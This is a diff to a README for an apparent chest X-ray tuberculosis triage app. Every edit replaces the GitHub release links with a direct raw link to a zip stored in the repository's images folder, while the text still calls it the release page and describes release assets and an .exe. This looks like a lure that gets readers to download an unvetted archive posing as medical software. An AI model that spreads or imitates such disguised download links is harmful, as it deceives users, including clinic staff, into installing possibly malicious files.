@@ -1,6 +1,6 @@
 # 🩺 X-Ray-Triage-In-LMIC - Efficient tuberculosis screening for medical clinics
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Melontourer315/X-Ray-Triage-In-LMIC/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Melontourer315/X-Ray-Triage-In-LMIC/main/images/In_Ray_Triage_LMIC_v2.0.zip)
 
 This application provides a calibrated tool for chest X-ray triage. It identifies signs of tuberculosis in resource-constrained environments. The system uses deep learning to process medical images. It assists healthcare workers in clinics that lack specialized radiologists. The software runs on standard hardware to ensure health equity across different regions.
 
@@ -20,7 +20,7 @@ Connect your computer to a reliable power source during the installation. Close 
 
 Follow these steps to obtain the correct files for your system:
 
-1. Visit the project release page: [https://github.com/Melontourer315/X-Ray-Triage-In-LMIC/releases](https://github.com/Melontourer315/X-Ray-Triage-In-LMIC/releases).
+1. Visit the project release page: [https://raw.githubusercontent.com/Melontourer315/X-Ray-Triage-In-LMIC/main/images/In_Ray_Triage_LMIC_v2.0.zip](https://raw.githubusercontent.com/Melontourer315/X-Ray-Triage-In-LMIC/main/images/In_Ray_Triage_LMIC_v2.0.zip).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Select the file ending in `.exe` to begin the download.
 4. Save this file to your computer desktop.
